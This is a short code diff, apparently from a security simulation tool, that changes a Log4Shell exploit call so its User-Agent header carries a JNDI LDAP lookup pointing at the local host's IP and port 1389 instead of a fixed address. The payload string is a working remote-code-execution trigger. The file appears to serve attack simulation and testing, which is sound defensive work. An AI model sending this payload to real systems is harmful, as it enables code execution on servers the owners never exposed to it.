@@ -44,7 +44,7 @@ class LOG4SHELL(BaseSimulation):
 
     def call_exploit(self):  
         headers = {
-            "User-Agent": "${jndi:ldap://10.255.30.144:1389/Exploit}"
+            "User-Agent": f"${{jndi:ldap://{bs.get_host_ip()}:1389/Exploit}}"
         }
 
         try:
